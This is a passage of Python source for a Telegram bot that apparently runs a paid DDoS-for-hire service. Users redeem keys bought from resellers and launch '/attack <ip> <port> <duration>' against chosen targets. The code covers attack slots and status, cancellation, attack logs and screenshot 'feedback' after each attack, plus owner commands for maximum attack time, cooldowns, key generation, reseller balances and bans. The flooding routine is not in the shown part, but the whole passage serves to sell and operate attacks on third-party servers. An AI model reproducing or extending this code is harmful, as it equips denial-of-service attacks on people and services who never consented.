                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }},
            upsert=True
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⭐ Type: {key_type}\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}\n⚡ Max Attack: {max_attack_time}s", reply_to=message, parse_mode="Markdown")

# ============ MY KEY COMMAND ============

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, "❌ You don't have a key!", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_username}", reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "❌ Key expired!", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))
    
    safe_send_message(message.chat.id, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⭐ Type: {key_type}\n⏳ Remaining: {remaining}\n⚡ Max Attack: {max_attack}s\n✅ Status: Active", reply_to=message, parse_mode="Markdown")

# ============ STATUS COMMAND ============

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id) and message.chat.type not in ['group', 'supergroup']:
        safe_send_message(message.chat.id, "❌ Purchase a key first!", reply_to=message)
        return
    
    # Get ALL active attacks
    active_attacks_list = []
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in active_attacks.items():
            if attack['end_time'] > now:
                remaining = int((attack['end_time'] - now).total_seconds())
                total = attack['duration']
                elapsed = total - remaining
                percentage = int((elapsed / total) * 100) if total > 0 else 0
                active_attacks_list.append({
                    'target': attack.get('target'),
                    'port': attack.get('port'),
                    'remaining': remaining,
                    'percentage': percentage
                })
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_groups = approved_groups_collection.count_documents({})
    private_users = bot_users_collection.count_documents({})
    blocked_ips_count = len(get_all_blocked_ips())
    
    response = "╔════════════════════════════════════════╗\n"
    response += "║           🔥 ATTACK STATUS 🔥           ║\n"
    response += "╠════════════════════════════════════════╣\n"
    
    if active_attacks_list:
        response += f"║  ⚔️ Active Attacks: {len(active_attacks_list)}/{total_slots}                  ║\n"
        response += "╠════════════════════════════════════════╣\n"
        for i, attack in enumerate(active_attacks_list, 1):
            target_display = f"{attack['target']}:{attack['port']}"
            if len(target_display) > 30:
                target_display = target_display[:27] + "..."
            progress_bar = create_progress_bar(attack['percentage'], 15)
            response += f"║  {i}. 🎯 {target_display:<30} ║\n"
            response += f"║     ⏱️ Time left: {attack['remaining']}s  [{progress_bar}] {attack['percentage']}%      ║\n"
            if i < len(active_attacks_list):
                response += "║  ──────────────────────────────────────  ║\n"
    else:
        response += "║           💤 No active attack            ║\n"
    
    response += "╠════════════════════════════════════════╣\n"
    response += f"║  🟢 Free Slots: {free_slots}/{total_slots}                     ║\n"
    response += f"║  🔴 Used Slots: {busy_slots}/{total_slots}                     ║\n"
    response += "╚════════════════════════════════════════╝\n"
    response += f"\n👥 Active Groups: {active_groups}\n"
    response += f"👤 Private Users: {private_users}\n"
    response += f"🚫 Blocked IPs: {blocked_ips_count}\n"
    response += f"⚙️ Max Time: {get_max_attack_time()}s\n"
    response += f"⚡ Concurrent/Attack: {get_concurrent_limit()}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ OTHER COMMANDS (cancel, myaccess, photo feedback) ============

@bot.message_handler(commands=["cancel"])
def cancel_attack_command(message):
    user_id = message.from_user.id
    
    if check_banned(message): return
    
    with _attack_lock:
        found = False
        for attack_id, attack in list(active_attacks.items()):
            if attack.get('user_id') == user_id:
                del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]
                found = True
                break
        
        if found:
            safe_send_message(message.chat.id, "✅ Your active attack has been cancelled!", reply_to=message)
        else:
            safe_send_message(message.chat.id, "❌ You have no active attack to cancel!", reply_to=message)

@bot.message_handler(commands=["myaccess"])
def my_access_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, "❌ You don't have any active access!", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, "❌ Your access has expired!", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    reseller_name = user.get('reseller_username', 'None')
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))
    
    access_msg = f"📋 Your Access Details\n\n🔑 Key: `{user['key']}`\n⭐ Type: {key_type}\n⏳ Time Left: {remaining}\n⚡ Max Attack: {max_attack}s\n💼 Reseller: @{reseller_name}\n✅ Status: Active"
    
    safe_send_message(message.chat.id, access_msg, reply_to=message, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    fb = get_pending_feedback(user_id, is_group, group_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id, is_group, group_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    safe_send_message(message.chat.id, 
        "<b>✅ Feedback Received!</b>\n\n"
        "🎉 Thank you for your feedback!\n\n"
        "<b>⚡ You can now start a new attack using /attack command.</b>",
        reply_to=message, parse_mode="HTML")
    
    attack_type = "GROUP" if is_group else "PRIVATE"
    location = f"Group ID: {group_id}" if is_group else "Private Chat"
    
    if BOT_OWNER:
        try:
            owner_msg = (
                f"📸 <b>NEW ATTACK FEEDBACK</b>\n\n"
                f"<b>👤 User:</b> {user_name}\n"
                f"<b>📛 Username:</b> @{username if username else 'N/A'}\n"
                f"<b>🆔 ID:</b> <code>{user_id}</code>\n"
                f"<b>📍 Location:</b> {location}\n"
                f"<b>📊 Type:</b> {attack_type}\n\n"
                f"<b>🎯 Target:</b> {fb['target']}:{fb['port']}\n"
                f"<b>⏱️ Duration:</b> {fb['duration']}s\n"
                f"<b>🕐 Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
            )
            
            for owner in BOT_OWNER:
                if bot:
                    bot.send_photo(
                        owner, 
                        message.photo[-1].file_id, 
                        caption=owner_msg,
                        parse_mode="HTML"
                    )
        except Exception as e:
            print(f"Failed to forward feedback to owner: {e}")

@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    set_setting('feedback_required', True)
    safe_send_message(message.chat.id, "✅ Feedback requirement ENABLED! Users must send feedback after each attack.", reply_to=message)

@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    set_setting('feedback_required', False)
    safe_send_message(message.chat.id, "✅ Feedback requirement DISABLED! Users can attack without sending feedback.", reply_to=message)

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    help_text = '''
👑 OWNER PANEL

Use /config to open the interactive configuration panel.

📋 QUICK COMMANDS:

🚫 IP BLOCKING:
• /blockip <prefix> - Block IP prefix (eg: /blockip 20.204)
• /unblockip <prefix> - Unblock IP prefix
• /blockedips - List all blocked IPs

⚙️ ATTACK SETTINGS:
• /setmaxslot <slots> - Set max simultaneous attacks
• /setconcurrent <value> - Set concurrent per attack
• /maxattack <sec> - Set max time for normal keys
• /cooldown <sec> - Set cooldown

🔑 KEY MANAGEMENT:
• /gen - Generate keys (choose VIP/NORMAL)
• /key <key> - Key details
• /allkeys - All keys
• /delkey <key> - Delete key
• /delexpkey - Delete expired keys
• /trail <hrs> <max> - Trail keys

👥 USER MANAGEMENT:
• /allusers - All users
• /extend <id> <time> - Extend time
• /extendall <time> - Extend everyone's time
• /down <id> <time> - Reduce time
• /ban <id> - Ban user
• /unban <id> - Unban user
• /tban <id> <time> - Temp ban

💼 RESELLER MANAGEMENT:
• /addreseller <id> - Add reseller
• /removereseller <id> - Remove reseller
• /blockreseller <id> - Block
• /unblockreseller <id> - Unblock
• /allresellers - All resellers
• /saldoadd <id> <amt> - Add balance
• /saldoremove <id> <amt> - Remove balance
• /saldo <id> - Check balance

👥 GROUP MANAGEMENT:
• /addgrp <name> <group_id> <days> - Approve group
• /delgrp <name> - Remove group approval
• /grpinfo - List approved groups
• /setgrp <group_id> <setting> <value> - Configure group (max_time, cooldown, max_slots, feedback)

📢 BROADCAST:
• /broadcast - Message to all
• /broadcastreseller - Message to resellers
• /broadcastpaid - Message to paid users only

📊 MONITORING:
• /live - Server stats
• /logs - Attack logs
• /dellogs - Delete all logs

🔧 MAINTENANCE:
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 Welcome Owner!

Use /owner to see all commands or /config for interactive panel.

Basic commands:
🔸 /attack <ip> <port> <duration> - Launch attack
🔸 /status - Check attack status
🔸 /cancel - Cancel active attack
🔸 /redeem <key> - Redeem a key
🔸 /myaccess - Check your access
🔸 /id - Get your ID
'''
    elif is_reseller(user_id):
        help_text = '''
💼 RESELLER PANEL

Commands:
🔸 /attack <ip> <port> <duration> - Launch attack
🔸 /redeem <key> - Redeem a key
🔸 /status - Check attack status
🔸 /cancel - Cancel active attack
🔸 /myaccess - Check your access
🔸 /id - Get your ID
🔸 /mysaldo - Check your balance
🔸 /prices - View key prices
🔸 /gen - Generate keys
'''
    else:
        help_text = '''
📚 Available Commands:

🔸 /start - Start interacting with the bot
🔸 /attack <ip> <port> <duration> - Launch attack
🔸 /redeem <key> - Redeem a key
🔸 /status - Check attack status
🔸 /cancel - Cancel active attack
🔸 /myaccess - Check your access
🔸 /id - Get your ID

📸 Feedback Required: After each attack, you must send a screenshot to continue.
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

Use /owner to see all commands or /config for interactive panel.
Use /help to see basic commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

Here are the commands you can use:

🔸 /start - Start interacting with the bot.
🔸 /attack <ip> <port> <duration> - Launch attack.
🔸 /redeem <key> - Redeem a key.
🔸 /status - Check attack status.
🔸 /cancel - Cancel active attack.
🔸 /myaccess - Check your access.
🔸 /id - Get your ID.

📸 Feedback Required: After each attack, you must send a screenshot to continue.
'''
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    
    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
    
    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_count = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
    
    maint_status = "🔴 Enabled" if is_maintenance() else "✅ Disabled"
    
    response = "═══════════════════════════\n"
    response += "📊 SERVER STATISTICS\n"
    response += "═══════════════════════════\n\n"
    
    response += "🤖 BOT INFORMATION\n"
    response += f"• Uptime: {uptime_str}\n"
    response += f"• Memory Usage: {memory_mb:.1f} MB\n"
    response += f"• CPU Usage: {cpu_percent:.1f}%\n"
    response += f"• Threads: {threads}\n\n"
    
    response += "💻 SYSTEM INFORMATION\n"
    response += f"• System: {system_info}\n"
    response += f"• CPU: {cpu_overall:.1f}% overall\n"
    response += f"• RAM: {ram_percent:.1f}% used ({ram_used:.0f}MB/{ram_total:.0f}MB)\n"
    response += f"• Disk: {disk_percent:.1f}% used\n\n"
    
    response += f"• Active Attacks: {active_count}/{total_slots}\n"
    response += f"• Maintenance Mode: {maint_status}\n\n"
    
    response += "📈 BOT DATA\n"
    response += f"• Total Users: {total_users}\n"
    response += f"• Active Users (Keys): {active_users}\n"
    response += f"• Online Users: {online_users}\n"
    response += f"• Resellers: {total_resellers}\n"
    response += f"• Available Keys: {active_keys}\n"
    response += f"• Total Keys: {total_keys}\n"
    response += f"• Blocked IPs: {len(get_all_blocked_ips())}\n"
    response += f"• Approved Groups: {approved_groups_collection.count_documents({})}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1).limit(200))
    
    if not all_logs:
        safe_send_message(message.chat.id, "📋 No attack logs found!", reply_to=message)
        return
    
    content = "═══════════════════════════\n"
    content += "       ATTACK LOGS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"Total Attacks (last 200): {len(all_logs)}\n\n"
    content += "───────────────────────────\n"
    
    for i, log in enumerate(all_logs, 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"
    
    content += "═══════════════════════════\n"
    content += f"END OF LOGS\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    if bot:
        bot.send_document(message.chat.id, file, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(all_logs)}")

@bot.message_handler(commands=["dellogs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    count = attack_logs_collection.count_documents({})
    
    if count == 0:
        safe_send_message(message.chat.id, "📋 No logs to delete!", reply_to=message)
        return
    
    attack_logs_collection.delete_many({})
    
    safe_send_message(message.chat.id, f"✅ {count} attack logs deleted!", reply_to=message)

@bot.message_handler(commands=["maxattack"])
def max_attack_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {current}s\n\nChange: /maxattack <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"✅ Max Attack Time set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"⏳ Current Cooldown: {current}s\n\nChange: /cooldown <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, "❌ Cooldown cannot be negative!", reply_to=message)
            return
        
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"✅ Cooldown set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["setmaxslot"])
def set_max_slot_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /setmaxslot <slots>\n\nExample: /setmaxslot 4\n\nThis sets how many attacks can run simultaneously.")
        return
    
    try:
        global current_max_slots
        new_slots = int(command_parts[1])
        
        if new_slots < 1:
            new_slots = 1
        if new_slots > 10:
            new_slots = 10
        
        current_max_slots = new_slots
        set_setting('max_concurrent_slots', new_slots)
        
        bot.reply_to(message, f"✅ Max simultaneous attack slots set to: {new_slots}\n\nNow {new_slots} attacks can run at the same time.")
    except:
        bot.reply_to(message, "❌ Invalid number! Use: /setmaxslot <slots>")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot is updating, please wait 10 minutes", reply_to=message)
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {msg}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not is_maintenance():
        safe_send_message(message.chat.id, "ℹ️ Maintenance mode is already OFF!", reply_to=message)
        return
    
    set_maintenance(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /extend <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        if bot:
            bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ Time Extended!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Added: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["extendall"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /extendall <time>", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    
    if not all_users:
        safe_send_message(message.chat.id, "❌ No users with keys found!", reply_to=message)
        return
    
    extended_count = 0
    notified_count = 0
    
    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')
        
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
            
        users_collection.update_one(
            {'user_id': uid},
            {'$set': {'key_expiry': new_expiry}}
        )
        extended_count += 1
        
        try:
            if bot:
                bot.send_message(uid, f"🎉 Time Extended for ALL Users!\n\n⏰ Added: {duration_label}\n\nEnjoy!")
                notified_count += 1
        except:
            pass
            
    safe_send_message(message.chat.id, f"✅ Done! Everyone's time has been extended.\n\n👤 Total Users: {extended_count}\n📨 Notified: {notified_count}\n⏰ Added: {duration_label}", reply_to=message)

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /down <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, "❌ User does not have an active key!", reply_to=message)
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        safe_send_message(message.chat.id, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!", reply_to=message)
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"✅ Time Reduced!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Reduced: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /delkey <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    result = keys_collection.delete_one({'key': key_input})
    
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        safe_send_message(message.chat.id, f"✅ Key `{key_input}` deleted!", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /key <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🔑 KEY DETAILS\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🔑 Key: {key_input}\n"
    response += f"⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"⏱️ Seconds: {key_doc.get('duration_seconds', 0)}\n"
    response += f"📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"👤 Creator: {creator} (Reseller)\n"
    else:
        response += f"👤 Creator: OWNER\n"
    
    response += f"\n📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
    response += f"⭐ Type: {key_doc.get('key_type', 'NORMAL')}\n"
    response += f"⚡ Max Attack: {key_doc.get('max_attack_time', 300)}s\n"
    
    if key_doc.get('used'):
        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
        
        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n─── USER INFO ───\n"
            response += f"👤 Username: {user.get('username', 'Unknown')}\n"
            response += f"🆔 User ID: {user.get('user_id', 'Unknown')}\n"
            
            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"⏳ Remaining: {remaining}\n"
                    response += f"✅ Status: ACTIVE\n"
                else:
                    response += f"❌ Status: EXPIRED\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))
    
    content = "═══════════════════════════\n"
    content += "       ALL KEYS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 UNUSED KEYS ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Type: {key.get('key_type', 'NORMAL')}\n"
        content += f"   Created: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   By: {key.get('created_by_username')}\n"
        content += "\n"
    
    if not unused_keys:
        content += "   No unused keys\n\n"
    
    content += f"\n🔴 USED KEYS ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Type: {key.get('key_type', 'NORMAL')}\n"
        content += f"   Used by: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   Created by: {key.get('created_by_username')}\n"
        content += "\n"
    
    if not used_keys:
        content += "   No used keys\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(unused_keys)} unused | {len(used_keys)} used\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    if bot:
        bot.send_document(message.chat.id, file, caption=f"📋 All Keys Report\n\n🟢 Unused: {len(unused_keys)}\n🔴 Used: {len(used_keys)}")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
